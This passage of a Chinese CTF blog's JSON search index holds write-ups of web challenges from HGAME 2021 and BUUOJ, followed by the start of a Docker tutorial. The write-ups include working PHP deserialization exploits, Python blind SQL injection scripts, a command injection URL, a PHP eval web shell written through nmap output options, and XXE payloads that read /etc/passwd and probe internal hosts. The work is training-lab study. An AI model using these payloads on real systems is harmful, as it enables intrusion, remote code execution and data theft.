&#x3D; $simulator-&gt;draw($_POST[&quot;draw&quot;]);\n&#125;\n?&gt;\n&lt;html lang&#x3D;&quot;en&quot;&gt;\n\n&lt;head&gt;\n    &lt;title&gt;Arknights&lt;&#x2F;title&gt;\n    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;\n    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;\n    &lt;link href&#x3D;&quot;static&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;\n    &lt;link href&#x3D;&quot;&#x2F;static&#x2F;css&#x2F;cover.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;\n&lt;&#x2F;head&gt;\n\n&lt;body class&#x3D;&quot;text-center&quot;&gt;\n    &lt;div class&#x3D;&quot;d-flex w-100 h-100 p-3 mx-auto flex-column&quot;&gt;\n        &lt;header class&#x3D;&quot;mastfoot mt-auto&quot;&gt;\n            &lt;h1&gt;非酋证明器&lt;&#x2F;h1&gt;\n            &lt;br&gt;\n            &lt;br&gt;\n        &lt;&#x2F;header&gt;    \n    &lt;main style&#x3D;&quot;height: 85%&quot;&gt;\n        &lt;div class&#x3D;&quot;card own&quot;&gt;\n            &lt;h5 class&#x3D;&quot;card-header&quot; style&#x3D;&quot;color: blue&quot;&gt;抽中的六星干员&lt;&#x2F;h5&gt;\n            &lt;div class&#x3D;&quot;card-body&quot;&gt;\n                &lt;?php\n                    $legendary &#x3D; $simulator-&gt;getLegendary();\n                    foreach ($legendary as $worker)&#123;\n\n                        echo &quot;&lt;p class&#x3D;&#39;legendary&#39;&gt;&quot;.$worker[&quot;type&quot;].&quot; &quot;.$worker[&quot;name&quot;].&quot;&lt;&#x2F;p&gt;&quot;;\n\n                    &#125;\n                ?&gt;\n            &lt;&#x2F;div&gt;\n        &lt;&#x2F;div&gt;\n        &lt;div class&#x3D;&quot;card col-md-3&quot; style&#x3D;&quot;color: #007bff;width&#x3D;100%;&quot;&gt;\n            &lt;h5 class&#x3D;&quot;card-header&quot;&gt;刀客塔，你要老婆不要？&lt;&#x2F;h5&gt;\n            &lt;div class&#x3D;&quot;card-body&quot;&gt;\n                &lt;?php\n                if(!empty($cards))&#123;\n                    echo &quot;&lt;h5 class&#x3D;\\&quot;card-title\\&quot;&gt;抽卡结果：&lt;&#x2F;h5&gt;&quot;;\n                    echo &quot;&lt;br&gt;&quot;;\n                &#125;\n                foreach ($cards as $card)&#123;\n                    switch ($card[&quot;stars&quot;])&#123;\n                        case 3:\n                            echo &quot;&lt;p class&#x3D;&#39;normal&#39;&gt;&quot;.$card[&quot;card&quot;][&quot;star&quot;].&quot; &quot;.$card[&quot;card&quot;][&quot;type&quot;].&quot; &quot;.$card[&quot;card&quot;][&quot;name&quot;].&quot;&lt;&#x2F;p&gt;&quot;;\n                            break;\n                        case 4:\n                            echo &quot;&lt;p class&#x3D;&#39;rare&#39;&gt;&quot;.$card[&quot;card&quot;][&quot;star&quot;].&quot; &quot;.$card[&quot;card&quot;][&quot;type&quot;].&quot; &quot;.$card[&quot;card&quot;][&quot;name&quot;].&quot;&lt;&#x2F;p&gt;&quot;;\n                            break;\n                        case 5:\n                            echo &quot;&lt;p class&#x3D;&#39;epic&#39;&gt;&quot;.$card[&quot;card&quot;][&quot;star&quot;].&quot; &quot;.$card[&quot;card&quot;][&quot;type&quot;].&quot; &quot;.$card[&quot;card&quot;][&quot;name&quot;].&quot;&lt;&#x2F;p&gt;&quot;;\n                            break;\n                        case 6:\n                            echo &quot;&lt;p class&#x3D;&#39;legendary&#39;&gt;&quot;.$card[&quot;card&quot;][&quot;star&quot;].&quot; &quot;.$card[&quot;card&quot;][&quot;type&quot;].&quot; &quot;.$card[&quot;card&quot;][&quot;name&quot;].&quot;&lt;&#x2F;p&gt;&quot;;\n                            break;\n                    &#125;\n                &#125;\n                ?&gt;\n                &lt;br&gt;\n                &lt;hr&gt;\n                &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;&quot;&gt;\n                    &lt;button class&#x3D;&quot;btn btn-primary&quot; name&#x3D;&quot;draw&quot; value&#x3D;&quot;1&quot;&gt;抽一次&lt;&#x2F;button&gt;\n                    &lt;button class&#x3D;&quot;btn btn-primary&quot; name&#x3D;&quot;draw&quot; value&#x3D;&quot;10&quot;&gt;连连连连连连连连连连!&lt;&#x2F;button&gt;\n                &lt;&#x2F;form&gt;\n            &lt;&#x2F;div&gt;\n        &lt;&#x2F;div&gt;\n\n    &lt;&#x2F;main&gt;\n    &lt;footer class&#x3D;&quot;mastfoot mt-auto&quot;&gt;\n        &lt;p&gt;Made by 109发抽不到&lt;del&gt;老婆&lt;&#x2F;del&gt;夕的&lt;b&gt;R4u&lt;&#x2F;b&gt;.&lt;&#x2F;p&gt;\n    &lt;&#x2F;footer&gt;\n&lt;&#x2F;div&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n首先index.php主要就是包含了simulator.php文件，重点就在simulator.php文件里，pool.php主要是一个英雄池不用管了。simulator.php里看来一遍，可以在Session类的save()和extract()函数处，发现一个存在的序列化和反序列化利用点，并且可以发现Cookie的生成方式,这里就不赘述了，利用反序列的数据也是通过cookie传递。那么接着看看有没有可以被我们利用的其他类，发现了CardsPool类中有一个__toString()方法，方法中使用了file_get_content()函数，这里就可以用于读取文件，而我们的目的就是读取web根目录下的flag.php文件，所以我们这里考虑一下通过触发__toString()的方法。看到最后一个类Eeeeeeevallllllll，它会向屏幕打印信息，所以只要我们把CardsPool对象当作Eeeeeeevallllllll对象的一个成员msg，就可以触发__toString()方法，读取flag.php了。\nexp：\n&lt;?php\nclass CardsPool\n&#123;\n\n    public $cards;\n    private $file;\n\n    public function __construct($filePath)\n    &#123;\n        if (file_exists($filePath)) &#123;\n            $this->file = $filePath;\n        &#125; else &#123;\n            die(\"Cards pool file doesn't exist!\");\n        &#125;\n    &#125;\n\n    public function draw()\n    &#123;\n        $rand = mt_rand(1, 100);\n        $level = 0;\n\n        if ($rand >= 1 &amp;&amp; $rand &lt;= 42) &#123;\n            $level = 3;\n        &#125; elseif ($rand >= 43 &amp;&amp; $rand &lt;= 90) &#123;\n            $level = 4;\n        &#125; elseif ($rand >= 91 &amp;&amp; $rand &lt;= 99) &#123;\n            $level = 5;\n        &#125; elseif ($rand == 100) &#123;\n            $level = 6;\n        &#125;\n\n        $rand_key = array_rand($this->cards[$level]);\n\n        return array(\n            \"stars\" => $level,\n            \"No\" => $rand_key,\n            \"card\" => $this->cards[$level][$rand_key]\n        );\n    &#125;\n\n    public function init()\n    &#123;\n        $this->cards = include($this->file);\n    &#125;\n\n    public function __toString()&#123;\n        return file_get_contents($this->file);\n    &#125;\n&#125;\nclass Eeeeeeevallllllll&#123;\n    public $msg;\n\n    public function __destruct()\n    &#123;\n        echo $this->msg;\n    &#125;\n&#125;\n$key = \"7tH1PKviC9ncELTA1fPysf6NYq7z7IA9\";\n$a = new Eeeeeeevallllllll();\n$a->msg=new CardsPool(\"flag.php\");\n$se = serialize($a);\n$result = md5( $se. $key);\necho base64_encode($se).\".\".base64_encode($result);\n\npayload：\nTzoxNzoiRWVlZWVlZXZhbGxsbGxsbGwiOjE6e3M6MzoibXNnIjtPOjk6IkNhcmRzUG9vbCI6Mjp7czo1OiJjYXJkcyI7TjtzOjE1OiIAQ2FyZHNQb29sAGZpbGUiO3M6ODoiZmxhZy5waHAiO319.Y2Q1NjAzYWE3MjAxOWEwM2NjOWEwY2ZkNzk0ZmEwNzQ&#x3D;\n\nhgame{XI-4Nd-n!AN-D0e5Nt_eX|5T~4t_ALL}\nMiscBase全家福首先解一下base64：\nGY4DMNZWGE3EINRVG5BDKNZWGUZTCNRTGMYDMRBWGU2UMNZUGMYDKRRUHA2DOMZUGRCDGMZVIYZTEMZQGMZDGMJXIQ======\n解base32：\n6867616D657B57653163306D655F74305F4847344D335F323032317D\n解base16：\nhgame{We1c0me_t0_HG4M3_2021}\n","slug":"HGAME2021","date":"2021-01-31T13:25:26.000Z","categories_index":"CTF","tags_index":"HGAME 2021","author_index":"A1andNS"},{"id":"b68352af34123beef3525b42882db0af","title":"BUUOJ刷题1月第五周","content":"[BSidesCF 2020]Had a bad day考点：PHP伪协议\n这题上来就是一个选择，选择的内容是在url处category参数处，输入一个单引号，引发php报错。由此可以知道url传入的参数会先与”.php”进行拼接，然后使用include()来包含。\n\n这里想要直接输入flag和index都是不行的。但是php伪协议是可以使用的，所以利用php://来读取源码。\n&lt;?php\n\t$file = $_GET['category'];\n\tif(isset($file))\n\t&#123;\n\t\tif( strpos( $file, \"woofers\" ) !==  false || strpos( $file, \"meowers\" ) !==  false || strpos( $file, \"index\"))&#123;\n\t\t\tinclude ($file . '.php');\n\t\t&#125;\n\t\telse&#123;\n\t\t\techo \"Sorry, we currently only support woofers and meowers.\";\n\t\t\t&#125;\n\t&#125;\n?>\n\n看到代码恍然大悟，这就是为什么使用php://可以读index.php源码而直接传index是不行的了，因为第一次匹配到的位置的索引为0,不满足条件语句。\n发现可以构造index/../flag，也可以构造多一个协议，例如php://filter/read=convert.base64-encode/index/resource=flag\n\n解码base64得到：\n&lt;!-- Can you read this flag? --&gt;\n&lt;?php\n &#x2F;&#x2F; flag&#123;afb95817-2aed-477a-94f4-7b9230bc4245&#125;\n?&gt;\n\n\n[BJDCTF 2nd]简单注入考点：SQL注入(盲注)\n首先尝试注入，fuzz一下，发现’被过滤了。宽字节方式也不行，暂时卡住了，使用dirsearch扫描一下目录看看有无发现。\n\ncheck.php访问后只有一句You know，P3rh4ps needs a girl friend，就没有什么有用信息了。看一下robots.txt，发现有一个hint.txt。\n得到了SQL查询语句select * from users where username=&#39;$_POST[&quot;username&quot;]&#39; and password=&#39;$_POST[&quot;password&quot;]&#39;;，因为&#39;已经被过滤了，无法使用了，所以如果想要把语句闭合，就需要利用password的第一个单引号，那么就要让username的第二个引号被转义，我们可以使用\\，这个符号并没有被过滤。\n此时SQL查询语句就变成了\nselect * from users where username='\\' and password='$_POST['password']';\n\n这个时候再在password处去构造 or 1=1#，就会变成：\nselect * from users where username='\\' and password='or 1=1#'\n\n但是password位=被过滤了，改用&lt;，再password处构造or 1&lt;2#\n\n显示BJD needs to be stronger。\n使用or 1&gt;2#,则显示需要girl friend\n\n报错盲注入，\nimport requests\nimport time\n\n# url是随时更新的，具体的以做题时候的为准\nurl = 'http://50a9254c-9687-46d1-b48c-adb3488702ba.node3.buuoj.cn/index.php'\ncookie = 'CooKie: UM_distinctid=17748ea81331be-00f63fed48a451-13e3563-144000-17748ea81343e8'\ndata = &#123;\n        \"username\": \"admin\\\\\",\n        \"password\": \"\"\n        &#125;\nflag = ''\n\ni = 1\nwhile True:\n    # 从可打印字符开始\n    begin = 32\n    end = 126\n    mid = (begin + end) // 2\n    while begin &lt; end:\n        time.sleep(1)  # 延时操作\n        print(begin, mid, end)\n        data[\"password\"] = \"or ascii(substr(password,&#123;0&#125;,1))&lt;&#123;1&#125;#\".format(i, mid)\n        print(data[\"password\"])\n        r = requests.post(url, data=data)\n        # print(r.text)\n        if 'girl friend' in r.text:           # 布尔判断成立的时候的情况\n            begin = mid + 1\n            mid = (begin + end) // 2\n        else:\n            end = mid\n            mid = (begin + end) // 2\n\n    flag += chr(mid-1)     # 退出使的判断会多做一次，导致mid比实际的要大1\n    print(flag)\n    i += 1\n\n\n可以得到密码为OhyOuFOuNdit\n\n使用获取的密码登陆即可。\n\n[WUSTCTF2020]朴实无华看点：HTTP Header、PHP弱类型\n开局就报错了：\nHack me\nWarning: Cannot modify header information - headers already sent by (output started at &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php:3) in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 4\n\n产生这种错误的原因是发送或修改HTTP头信息的方法在有输出后才被调用。为什么会产生这种错误呢？因为http response总是先发送http header 然后才是html信息。所以PHP也必须先把头信息发出给web服务器，而且只能发送一次，再次之后就不允许再修改头信息了。这里的输出可以是print、echo、&lt;html&gt;,一旦有输出信息，http header就已经发送，所以再要更改就会产生报错。\n通过上面的警告，line4是指向调用header()失败的脚本行数。而先于header()的输出实在index.php的第3行。这里就是我们需要去找的过早输出的点。从报错前有输出hack me，可以猜测，第3行可能是使用了echo。\ndirsearch扫描目录，访问一下robots.txt看看，发现一个fAke_f1agggg.php，内如其名一个假flag，但是在假flag的这个http header发现了一个fl4g.php\n\n访问fl4g.php，依旧是PHP警告，也是和index.php一样的问题，但是这次有源码，好像是让我们闯关。\n//level 1\nif (isset($_GET['num']))&#123;\n    $num = $_GET['num'];\n    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) > 2021)&#123;\n        echo \"鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.&lt;/br>\";\n    &#125;else&#123;\n        die(\"閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�\");\n    &#125;\n&#125;else&#123;\n    die(\"鍘婚潪娲插惂\");\n&#125;\n\n这里要求num必须小于2020，num+1要大于2021。这个肯定是涉及到弱类型绕过问题。intval()函数用于获取变量的整数值，通过使用指定的进制base转换(默认是十进制)，返回变量var的integer数值。intval()不能用于object，否则会产生E_NOTICE错误并且返回1。\n返回值\n成功时返回 var 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。\n最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。\n字符串有可能返回 0，虽然取决于字符串最左侧的字符。\n由于靶机是php5的环境，所以可以使用2e4来绕过，2e4会被解析为2，而2e4+1被解析为20001\n\n成功绕过第一关。\n//level 2\nif (isset($_GET['md5']))&#123;\n   $md5=$_GET['md5'];\n   if ($md5==md5($md5))\n       echo \"鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.&lt;/br>\";\n   else\n       die(\"鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�\");\n&#125;else&#123;\n    die(\"鍘婚潪娲插惂\");\n&#125;\n\n第二关是md5的弱类型比较，重点是需要原来的值的md5要==原来的值，这个问题就是0e开头的字符串md5()后还是0e开头。这就是双md5碰撞问题。\n找了一圈，发现了一个0e18bb6e1d5c2e19b63898aeed6b37ea\n他的md5还是0e0a710a092113dd5ec9dd47d4d7b86f\n所以使用payload:\nmd5=0e18bb6e1d5c2e19b63898aeed6b37ea,可惜本地测试一下发现比较不成功，后来又发现一个payload:0e215962017最后一关获取flag\n//get flag\nif (isset($_GET['get_flag']))&#123;\n    $get_flag = $_GET['get_flag'];\n    if(!strstr($get_flag,\" \"))&#123;\n        $get_flag = str_ireplace(\"cat\", \"wctf2020\", $get_flag);\n        echo \"鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.&lt;/br>\";\n        system($get_flag);\n    &#125;else&#123;\n        die(\"蹇埌闈炴床浜�\");\n    &#125;\n&#125;else&#123;\n    die(\"鍘婚潪娲插惂\");\n&#125;\n\n过滤了空格，所以不能直接使用空格了，改用$IFS$1,cat不可用，改用tac命令。\npayload:\nhttp:&#x2F;&#x2F;00d5f171-fda9-4cfb-8d25-c9bceeafc667.node3.buuoj.cn&#x2F;fl4g.php?num&#x3D;2e5&amp;md5&#x3D;0e215962017&amp;get_flag&#x3D;tac$IFS$1fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag\n\n[网鼎杯 2020 朱雀组]Nmap考点：nmap写webshell\n这里很明确的提到了nmap，直接去查看了一下nmap的中文手册，发现有很多Output选项，所以可以尝试用output选项来写webshell。\nNmap输出格式\n\n-oN &lt;filespec&gt; (标准输出)\n要求将标准输出直接写入指定 的文件。如上所述，这个格式与交互式输出 略有不同。\n\n-oX &lt;filespec&gt; (XML输出)\n要求XML输出直接写入指定 的文件。Nmap包含了一个文档类型定义(DTD)，使XML解析器有效地 进行XML输出。这主要是为了程序应用，同时也可以协助人工解释 Nmap的XML输出。DTD定义了合法的格式元素，列举可使用的属性和 值。最新的版本可在 http:&#x2F;&#x2F;www.insecure.org&#x2F;nmap&#x2F;data&#x2F;nmap.dtd获取。\n\nXML提供了可供软件解析的稳定格式输出，主要的计算机 语言都提供了免费的XML解析器，如C&#x2F;C++，Perl，Python和Java。 针对这些语言有一些捆绑代码用于处理Nmap的输出和特定的执行程序。 例如perl CPAN中的Nmap::Scanner 和Nmap::Parser。 对几乎所有与Nmap有接口的主要应用来说，XML是首选的格式。\n\nXML输出引用了一个XSL样式表，用于格式化输出结果，类似于 HTML。最方便的方法是将XML输出加载到一个Web浏览器，如Firefox 或IE。由于nmap.xsl文件的绝对 路径，因此通常只能在运行了Nmap的机器上工作(或类似配置的机器)。 类似于任何支持Web机器的HTML文件，--stylesheet 选项可用于建立可移植的XML文件。\n\n-oS &lt;filespec&gt; (ScRipT KIdd|3 oUTpuT)\n脚本小子输出类似于交互工具输出，这是一个事后处理，适合于 &#39;l33t HaXXorZ， 由于原来全都是大写的Nmap输出。这个选项和脚本小子开了玩笑，看上去似乎是为了 “帮助他们”。\n\n-oG &lt;filespec&gt; (Grep输出)\n这种方式最后介绍，因为不建议使用。XML输格式很强大，便于有经验 的用户使用。XML是一种标准，由许多解析器构成，而Grep输届更简化。XML 是可扩展的，以支持新发布的Nmap特点。使用Grep输出的目的是忽略这些 特点，因为没有足够的空间。\n\n然面，Grep输出仍然很常使用。它是一种简单格式，每行一个主机，可以 通过UNIX工具(如grep、awk、cut、sed、diff)和Perl方便地查找和分解。常可 用于在命令行上进行一次性测式。查找ssh端口打开或运行Sloaris的主机，只需 要一个简单的grep主机说明，使用通道并通过awk或cut命令打印所需的域。\n\nGrep输出可以包含注释(每行由#号开始)。每行由6个标记的域组成，由制表符及 冒号分隔。这些域有主机，端口， 协议，忽略状态， 操作系统，序列号， IPID和状态。\n\n这些域中最重要的是Ports，它提供 了所关注的端口的细节，端口项由逗号分隔。每个端口项代表一个所关注的端口， 每个子域由&#x2F;分隔。这些子域有：端口号， 状态，协议， 拥有者，服务， SunRPCinfo和版本信息。\n\n对于XML输出，本手册无法列举所有的格式，有关Nmap Grep输出的更详细信息可 查阅http:&#x2F;&#x2F;www.unspecific.com&#x2F;nmap-oG-output。\n\n-oA &lt;basename&gt; (输出至所有格式)\n为使用方便，利用-oA&lt;basename&gt;选项 可将扫描结果以标准格式、XML格式和Grep格式一次性输出。分别存放在 &lt;basename&gt;.nmap，&lt;basename&gt;.xml和 &lt;basename&gt;.gnmap文件中。也可以在文件名前 指定目录名，如在UNIX中，使用~&#x2F;nmaplogs&#x2F;foocorp&#x2F;， 在Window中，使用c:\\hacking\\sco on Windows。\n\npayload:\n127.0.0.1 | &lt;?php eval($_POST[&#39;alan&#39;]);?&gt; -oG alan.php \n显示hacker，发现php被过滤，只要出现php就会出现hacker\n尝试使用phtml，发现可以使用。\n\n被转义了，说明存在转义函数，那就让后面的内容称为一个字符串，这样转义时转义的时单引号。\n127.0.0.1 | &#39; &lt;?&#x3D;eval($_POST[&#39;alan&#39;]);?&gt; -oG alan.phtml &#39;\n\n蚁剑连接这里在/flag可以获取flag，在index.php中可以看到使用了两个过滤函数，escapeshellarg()、escapeshellcmd()\n[极客大挑战 2019]FinalSQL考点：SQL注入异或\n注入点按照提示就是id处了，然后过滤了很多东西，例如空格、and等等。可以使用异或来做，\nid=1^1是click，id=1^0是error，上脚本：\nimport requests\nimport time\n\n# url是随时更新的，具体的以做题时候的为准\n# url = 'http://bdd094c1-1f95-40ae-a983-e0744076a014.node3.buuoj.cn/search.php'\ncookie = 'CooKie: UM_distinctid=17748ea81331be-00f63fed48a451-13e3563-144000-17748ea81343e8'\nflag = ''\ni = 1\nwhile True:\n    # 从可打印字符开始\n    begin = 32\n    end = 126\n    mid = (begin + end) // 2\n    while begin &lt; end:\n        time.sleep(1)  # 延时操作\n        print(begin, mid, end)\n        url = \"http://bdd094c1-1f95-40ae-a983-e0744076a014.node3.buuoj.cn/search.php?id=1^(ascii(substr(database(),&#123;0&#125;,1))&lt;&#123;1&#125;)\".format(i, mid)\n        # url = \"http://bdd094c1-1f95-40ae-a983-e0744076a014.node3.buuoj.cn/search.php?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek')),&#123;0&#125;,1))&lt;&#123;1&#125;)\".format(i, mid)\n        # url = \"http://bdd094c1-1f95-40ae-a983-e0744076a014.node3.buuoj.cn/search.php?id=1^(ascii(substr((select(group_concat(username,':',password))from(F1nal1y)),&#123;0&#125;,1))&lt;&#123;1&#125;)\".format(i, mid)\n       # url = \"http://bdd094c1-1f95-40ae-a983-e0744076a014.node3.buuoj.cn/search.php?id=1^(ascii(substr((select(group_concat(username,':',password))from(F1naI1y)),&#123;0&#125;,1))&lt;&#123;1&#125;)\".format(i, mid)\n        print(url)\n        r = requests.get(url=url)\n        # print(r.text)\n        if 'Click others' in r.text:           # 布尔判断成立的时候的情况\n            begin = mid + 1\n            mid = (begin + end) // 2\n        else:\n            end = mid\n            mid = (begin + end) // 2\n\n    flag += chr(mid-1)     # 退出使的判断会多做一次，导致mid比实际的要大1\n    print(flag)\n    i += 1\n\n\n运行脚本爆出数据库为geek\n爆出表名有F1naI1y,Flaaaaag\nFlaaaaag内的字段有id,fl4gawsl\nflag没有在fl4gawsl中。\nF1naI1y中有字段 id,username,password\n查看用户密码\n在password中的最后一个可以爆出flag\n[MRCTF2020]PYWebsite考点：XXF、签到题\n&lt;script>\n\n    function enc(code)&#123;\n      hash = hex_md5(code);\n      return hash;\n    &#125;\n    function validate()&#123;\n      var code = document.getElementById(\"vcode\").value;\n      if (code != \"\")&#123;\n        if(hex_md5(code) == \"0cd4da0223c0b280829dc3ea458d655c\")&#123;\n          alert(\"您通过了验证！\");\n          window.location = \"./flag.php\"\n        &#125;else&#123;\n          alert(\"你的授权码不正确！\");\n        &#125;\n      &#125;else&#123;\n        alert(\"请输入授权码\");\n      &#125;\n      \n    &#125;\n\n  &lt;/script>\n\n直接去访问flag.php，提示\n我已经把购买者的IP保存了，显然你没有购买\n\n验证逻辑是在后端的，除了购买者和我自己，没有人可以看到flag\n\n所以尝试添加一个http头xxf试试，直接获得flag\n\n[NPUCTF2020]ReadlezPHP考点：PHP反序列化\n查看源码，发现./time.php?source，访问看看，得到源码。\n&lt;?php\n#error_reporting(0);\nclass HelloPhp\n&#123;\n    public $a;\n    public $b;\n    public function __construct()&#123;\n        $this->a = \"Y-m-d h:i:s\";\n        $this->b = \"date\";\n    &#125;\n    public function __destruct()&#123;\n        $a = $this->a;\n        $b = $this->b;\n        echo $b($a);\n    &#125;\n&#125;\n$c = new HelloPhp;\n\nif(isset($_GET['source']))\n&#123;\n    highlight_file(__FILE__);\n    die(0);\n&#125;\n\n@$ppp = unserialize($_GET[\"data\"]);\n\n\n看一下应该是要做反序列化，data是序列化字符传入点，在析构函数处存在一个字符串嵌套来实现函数执行的点，就是利用点了。\neval和system()函数都没有成功，但是可以使用assert()函数，断言函数是用于，*assert()可以将整个字符串参数当作php参数执行，而类似的eval()*函数是执行合法的php代码。\n所以使用exp:\n&lt;?php\n#error_reporting(0);\nclass HelloPhp\n&#123;\n    public $a;\n    public $b;\n    public function __construct()&#123;\n        $this-&gt;a &#x3D; &quot;Y-m-d h:i:s&quot;;\n        $this-&gt;b &#x3D; &quot;date&quot;;\n    &#125;\n    public function __destruct()&#123;\n        $a &#x3D; $this-&gt;a;\n        $b &#x3D; $this-&gt;b;\n        echo $b($a);\n    &#125;\n&#125;\n$c &#x3D; new HelloPhp;\n$c-&gt;a &#x3D; &quot;phpinfo()&quot;;\n$c-&gt;b &#x3D; &quot;assert&quot;;\n$d &#x3D; serialize($c);\nvar_dump($d);\n\npayload:\nO:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;\n[NCTF2019]True XML cookbook考点：xxe\nburp抓包查看信息，发现了xml形式的账号密码格式，我们尝试进行xxe\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;!DOCTYPE alan[\n&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n&lt;user>&lt;username>&amp;xxe;&lt;/username>&lt;password>\npassword\n&lt;/password>&lt;/user>\n\n/flag是不存在的，那么现收集一下信息，passwd看完了，看一下hosts文件。\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;!DOCTYPE alan[\n&lt;!ENTITY xxe SYSTEM \"file:///etc/hosts\">\n]>\n&lt;user>&lt;username>&amp;xxe;&lt;/username>&lt;password>\npassword\n&lt;/password>&lt;/user>\n\n没有发现有用的ip地址，再看一下/proc/net/arp\n\n可以发现10.99.142.2、和10.128.0.1两个IP地址。\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;!DOCTYPE alan[\n&lt;!ENTITY xxe SYSTEM \"http://10.99.142.2/\">\n]>\n&lt;user>&lt;username>&amp;xxe;&lt;/username>&lt;password>\npassword\n&lt;/password>&lt;/user>\n\n访问失败，显示连接被拒绝，使用burp的intruder去扫一下C段，看看存活主机。\n找到了10.99.142.11是可以访问的，成功获取到flag。\n\n[Misc]ningenbinwalk分析图片，发现存在zip后，binwalk分离文件，然后使用压缩包爆破工具爆出密码，解压获取flag\n","slug":"BUUOJ刷题1月第四周","date":"2021-01-29T15:52:22.000Z","categories_index":"CTF","tags_index":"CTF,BUUOJ","author_index":"A1andNS"},{"id":"804c228705dc2bd8721e58f306185d36","title":"Docker简单入门","content":"what is Docker?Docker是一个虚拟环境容器，可以将你的开发环境、代码、配置文件等一并打包到这个容器中，并发布和应用到任意平台中。比如，你在本地用Python开发网站后台，开发测试完成后，就可以将Python3及其依赖包、Flask及其各种插件、Mysql、Nginx等打包到一个容器中，然后部署到任意你想部署到的环境。\nDocker的三个概念\n镜像（Image）：类似于虚拟机中的镜像，是一个包含有文件系统的面向Docker引擎的只读模板。任何应用程序运行都需要环境，而镜像就是用来提供这种运行环境的。例如一个Ubuntu镜像就是一个包含Ubuntu操作系统环境的模板，同理在该镜像上装上Apache软件，就可以称为Apache镜像。\n\n容器（Container）：类似于一个轻量级的沙盒，可以将其看作一个极简的Linux系统环境（包括root权限、进程空间、用户空间和网络空间等），以及运行在其中的应用程序。Docker引擎利用容器来运行、隔离各个应用。容器是镜像创建的应用实例，可以创建、启动、停止、删除容器，各个容器之间是是相互隔离的，互不影响。注意：镜像本身是只读的，容器从镜像启动时，Docker在镜像的上层创建一个可写层，镜像本身不变。\n\n仓库（Repository）：类似于代码仓库，这里是镜像仓库，是Docker用来集中存放镜像文件的地方。注意与注册服务器（Registry）的区别：注册服务器是存放仓库的地方，一般会有多个仓库；而仓库是存放镜像的地方，一般每个仓库存放一类镜像，每个镜像利用tag进行区分，比如Ubuntu仓库存放有多个版本（12.04、14.04等）的Ubuntu镜像。\n\n\nDocker的安装和卸载Docker可以安装在Windows、Linux、Mac等各个平台上。具体可以查看文档Install Docker。安装完成之后，可以查看Docker的版本信息：\n使用命令docker version\nroot@A1andNS-PC:&#x2F;home&#x2F;a1andns# docker version\nClient: Docker Engine - Community\n Version:           19.03.8\n API version:       1.40\n Go version:        go1.14.2\n Git commit:        1b4342cd4c\n Built:             Fri Jun 19 03:26:58 2020\n OS&#x2F;Arch:           linux&#x2F;amd64\n Experimental:      false\n\n查看帮助信息使用docker –help\nDocker中关于镜像的基本操作搜索、获取、运行镜像安装完Docker引擎之后，就可以对镜像进行基本的操作了。\n我们从官方注册服务器（https://hub.docker.com）的仓库中pull下CentOS的镜像，前边说过，每个仓库会有多个镜像，用tag标示，如果不加tag，默认使用latest镜像:\ndocker search ubuntu #查看Ubuntu镜像是否存在。\ndocker pull ubuntu #利用pull命令获取镜像\ndocker images #查看当前系统中的images信息\ndocker run -it centos:v4 &#x2F;bin&#x2F;bash #运行一个镜像\n在容器中使用exit退出容器。\ndocker ps -a #查看docker中运行的容器\n\n创建一个镜像从已经有的镜像容器中创建docker commit -m &quot;centos with git&quot; -a &quot;A1andNS&quot; 1ee7ed3d4811 a1andns&#x2F;centos:git #把容器转换为镜像\n其中-m指定说明信息；-a指定用户信息；1ee7ed3d4811代表容器的id；xianhu&#x2F;centos:git指定目标镜像的用户名、仓库名和 tag 信息。\n\n利用Dockerfile创建Dockerfile可以理解为一种配置文件，用来告诉docker build命令应该执行哪些操作。一个简易的Dockerfile文件如下所示，官方说明：Dockerfile reference：\n# 说明该镜像以哪个镜像为基础\nFROM centos:latest\n\n# 构建者的基本信息\nMAINTAINER a1andns\n\n# 在build这个镜像时执行的操作\nRUN yum update\nRUN yum install -y git\n\n# 拷贝本地文件到镜像中\nCOPY .&#x2F;* 